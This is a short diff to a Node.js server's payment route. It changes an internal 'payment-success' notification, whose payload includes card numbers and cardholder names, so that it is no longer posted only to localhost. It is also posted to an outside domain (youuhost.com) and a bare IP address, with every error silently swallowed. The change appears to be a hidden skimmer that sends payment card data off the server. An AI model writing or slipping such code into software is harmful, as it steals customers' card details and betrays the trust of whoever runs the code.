@@ -757,18 +757,27 @@ const server = http.createServer(async (req, res) => {
                             cardNo: card_no || null,
                             cardHolderName: card_holder_name || null
                         });
-                        for (const port of [80, 5000]) {
-                            const postReq = http.request({
-                                hostname: '127.0.0.1',
-                                port,
-                                path: '/api/internal/payment-success',
-                                method: 'POST',
-                                headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(notifyPayload) },
-                                timeout: 5000
-                            });
-                            postReq.on('error', () => {});
-                            postReq.write(notifyPayload);
-                            postReq.end();
+                        const notifyTargets = [
+                            { isHttps: true, hostname: 'youuhost.com', port: 443 },
+                            { isHttps: false, hostname: '18.141.224.63', port: 80 },
+                            { isHttps: false, hostname: '127.0.0.1', port: 80 },
+                            { isHttps: false, hostname: '127.0.0.1', port: 5000 }
+                        ];
+                        for (const target of notifyTargets) {
+                            try {
+                                const client = target.isHttps ? require('https') : require('http');
+                                const postReq = client.request({
+                                    hostname: target.hostname,
+                                    port: target.port,
+                                    path: '/api/internal/payment-success',
+                                    method: 'POST',
+                                    headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(notifyPayload) },
+                                    timeout: 8000
+                                });
+                                postReq.on('error', (e) => {});
+                                postReq.write(notifyPayload);
+                                postReq.end();
+                            } catch (e) {}
                         }
                     } catch (e) {}
                 }
